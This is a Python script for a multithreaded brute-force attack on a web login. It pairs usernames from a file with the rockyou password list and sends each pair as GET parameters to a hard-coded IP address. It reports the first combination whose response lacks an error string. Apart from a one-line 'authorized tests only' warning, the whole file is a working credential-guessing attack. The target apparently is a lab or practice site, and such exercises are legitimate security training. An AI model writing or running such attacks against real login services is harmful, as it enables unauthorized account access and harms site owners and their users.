import threading
import requests
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

USERS_FILE = "./user.txt"
PASSWORDS_FILE = "./rockyou.txt"
URL_TEMPLATE = "http://104.238.21.89:3131/?page=signin&username={}&password={}&Login=Login#"

TIMEOUT = 8
DELAY = 0.0   
VERBOSE = True

stop_event = threading.Event()
found_credentials = {"user": None, "password": None}

def make_session(pool_size=10):
    s = requests.Session()
    retries = Retry(total=1, backoff_factor=0.2, status_forcelist=(500,502,503,504))
    adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size, max_retries=retries)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s

def worker(user):
    try:
        with open(PASSWORDS_FILE, "r", encoding="latin-1", errors="ignore") as pf:
            passwords = [l.rstrip("\r\n") for l in pf if l.strip()]
    except FileNotFoundError:
        print(f"{user} - Password file not found.")
        return

    session = make_session(pool_size=16)

    for idx, pwd in enumerate(passwords, start=1):
        if stop_event.is_set():
            return

        try:
            url = URL_TEMPLATE.format(user, pwd)
            resp = session.get(url, timeout=TIMEOUT)
        except requests.RequestException:
            continue

        if "WrongAnswer" not in resp.text:
            print(f"[FOUND] user={user} password={pwd}")
            found_credentials["user"] = user
            found_credentials["password"] = pwd
            stop_event.set()
            return

        if VERBOSE:
            print(f"[{user}] attempt {idx}/{len(passwords)} -> {pwd}")

        if DELAY:
            time.sleep(DELAY)

def main():
    try:
        with open(USERS_FILE, "r", encoding="latin-1", errors="ignore") as uf:
            users = [l.strip() for l in uf if l.strip()]
    except FileNotFoundError:
        print("Users file not found:", USERS_FILE)
        return

    if not users:
        print("User list is empty.")
        return

    print(f"Total users: {len(users)}")
    threads = []

    for user in users:
        t = threading.Thread(target=worker, args=(user,), daemon=True)
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("CTRL+C received, stopping...")
        stop_event.set()
        for t in threads:
            t.join()

    if stop_event.is_set():
        print(f"Match found, operation stopped.")
        print(f"User: {found_credentials['user']}")
        print(f"Password: {found_credentials['password']}")
    else:
        print("All attempts completed, no match found.")

if __name__ == "__main__":
    print("WARNING: This script should only be used in authorized tests.")
    start = time.time()
    main()
    print("Duration:", round(time.time()-start,2), "s")